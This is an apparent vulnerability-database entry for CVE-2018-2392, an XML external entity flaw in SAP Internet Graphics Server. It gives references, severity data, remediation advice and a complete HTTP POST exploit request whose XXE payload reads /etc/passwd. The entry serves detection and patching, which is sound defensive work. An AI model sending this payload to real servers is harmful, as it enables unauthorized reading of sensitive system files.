---
layout: "post"
cve_id: "CVE-2018-2392"
title: "SAP Internet Graphics Server (IGS) - XML External Entity Injection"
pcap: true
pcap_path: "/pcaps/2018/CVE-2018-2392.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2018/CVE-2018-2392.yaml"
author: "_generic_human_"
severity: "high"
impact: "Successful exploitation of this vulnerability can lead to unauthorized access to sensitive information or a complete system compromise.
"
remediation: "Apply the latest security patches and updates provided by SAP to mitigate this vulnerability. Additionally, ensure that the SAP Internet Graphics Server (IGS) is not exposed to untrusted networks or the internet.
"
reference:
  - "https://launchpad.support.sap.com/#/notes/2525222"
  - "https://blogs.sap.com/2018/02/13/sap-security-patch-day-february-2018/"
  - "https://www.rapid7.com/db/modules/auxiliary/admin/sap/sap_igs_xmlchart_xxe/"
  - "https://troopers.de/troopers18/agenda/3r38lr/"
  - "https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/admin/sap/sap_igs_xmlchart_xxe.rb"
  - "https://nvd.nist.gov/vuln/detail/CVE-2018-2392"
classification: "{'cvss-metrics': 'CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H', 'cvss-score': 7.5, 'cve-id': 'CVE-2018-2392', 'cwe-id': 'CWE-611', 'epss-score': 0.86959, 'epss-percentile': 0.99406, 'cpe': 'cpe:2.3:a:sap:internet_graphics_server:7.20:*:*:*:*:*:*:*'}"
metadata: "{'max-request': 1, 'vendor': 'sap', 'product': 'internet_graphics_server'}"
tags:
  - "cve"
  - "cve2018"
  - "sap"
  - "igs"
  - "xxe"
  - "xmlchart"
  - "msf"
  - "intrusive"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
SAP Internet Graphics Servers (IGS) running versions 7.20, 7.20EXT, 7.45, 7.49, or 7.53 has two XML external entity injection (XXE) vulnerabilities within the XMLCHART page - CVE-2018-2392 and CVE-2018-2393. These vulnerabilities occur due to a lack of appropriate validation on the Extension HTML tag when submitting a POST request to the XMLCHART page to generate a new chart.


## üåê HTTP Request
```nohighlight
POST /XMLCHART HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Connection: close
Content-Length: 1023
Content-Type: multipart/form-data; boundary=38CD70NMHujpuNLzyS0JPIXpnnc
Accept-Encoding: gzip

--38CD70NMHujpuNLzyS0JPIXpnnc
Content-Disposition: form-data; name="38CD6yZzq1hVEs3x4tsecC5ekQL"; filename="38CD724o1DgfeYoxptSelP7dLyt.xml"
Content-Type: application/xml

<?xml version='1.0' encoding='UTF-8'?>
    <ChartData>
      <Categories>
        <Category>ALttP</Category>
      </Categories>
      <Series label="38CD6yZACcMQKOkNt2FfCyK8uwv">
        <Point>
          <Value type="y">12345</Value>
        </Point>
      </Series>
    </ChartData>
--38CD70NMHujpuNLzyS0JPIXpnnc
Content-Disposition: form-data; name="38CD6zKPuzqSAJ48K299rSCmHCU"; filename="38CD6vt0RfAvNcTpLrzbU8I4rre.xml"
Content-Type: application/xml

<?xml version='1.0' encoding='UTF-8'?>
    <!DOCTYPE Extension [<!ENTITY xxe SYSTEM "/etc/passwd">]>
    <SAPChartCustomizing version="1.1">
      <Elements>
        <ChartElements>
          <Title>
            <Extension>&xxe;</Extension>
          </Title>
        </ChartElements>
      </Elements>
    </SAPChartCustomizing>
--38CD70NMHujpuNLzyS0JPIXpnnc--
```

